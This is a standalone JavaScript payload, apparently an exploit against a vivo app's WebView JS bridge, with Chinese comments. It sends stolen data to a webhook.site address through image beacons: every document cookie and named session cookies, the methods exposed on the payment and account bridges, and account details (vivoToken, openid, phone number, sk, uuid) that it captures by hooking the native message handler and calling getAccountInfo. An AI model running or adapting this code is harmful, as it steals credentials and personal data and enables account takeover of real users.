(function(){
var C='	https://webhook.site/4ee48446-1373-432b-ba15-292bd3f81eb8';
function b(t,d){new Image().src=C+'?t='+encodeURIComponent(t)+'&d='+encodeURIComponent(String(d||'').substring(0,2000));}
function bj(t,o){try{b(t,JSON.stringify(o));}catch(e){b(t+'_ERR',e.message);}}

// 1) document.cookie — 无 HttpOnly 保护
var cookies=document.cookie;
b('CK_RAW',(cookies||'EMPTY').substring(0,2000));
var pairs=cookies.split(';');
for(var i=0;i<pairs.length;i++){
    var kv=pairs[i].trim().split('=');
    if(kv.length>=2){
        var k=kv[0].trim();
        if(['vvc_r','vvc_openid','vvc_p','vvc_q','vvc_n','vvc_s','vvc_status','vvc_model','vvc_u','vvc_oaid'].indexOf(k)>=0)
            b('CK_'+k,kv.slice(1).join('=').substring(0,200));
    }
}

// 2) 枚举 JS Bridge
var br=window.WeiwoJSBridge||window.vivoJsBridge;
var vp=window.vivopay||window.AppWebClient;
['vivopay','vivoaccount','AppWebClient'].forEach(function(n){
    var o=window[n],m=[];
    if(!o){b('BR_'+n,'NF');return;}
    for(var p in o){try{if(typeof o[p]==='function')m.push(p);}catch(e){}}
    b('BR_'+n,m.join(','));
});

// 3) Hook _handleMessageFromNative — Native 返回的 requestdata 是 base64
if(br&&typeof br._handleMessageFromNative==='function'){
    var orig=br._handleMessageFromNative;
    br._handleMessageFromNative=function(msg){
        try{
            var t=JSON.parse(msg);
            if(t.requestdata&&typeof t.requestdata==='string'){
                try{
                    var decoded=JSON.parse(atob(t.requestdata));
                    if(decoded.accountInfo){
                        bj('ACCT_INFO',decoded);
                        var ai=decoded.accountInfo;
                        if(ai.vivoToken)b('VIVOTOKEN',ai.vivoToken);
                        if(ai.openid)b('ACCT_OPENID',ai.openid);
                        if(ai.phoneNum)b('ACCT_PHONE',ai.phoneNum);
                        if(ai.sk)b('ACCT_SK',ai.sk);
                        if(ai.uuid)b('ACCT_UUID',ai.uuid);
                    }
                }catch(e){}
            }
        }catch(e){}
        return orig.apply(this,arguments);
    };
}

// 4) getAccountInfo → vivoToken / sk / openid / phoneNum
if(br&&typeof br.call==='function'){
    br.call('getAccountInfo','{}',function(r){bj('ACCT_RAW',r);});
    b('ACCT_SENT','OK');
}


b('DONE','ok');
})();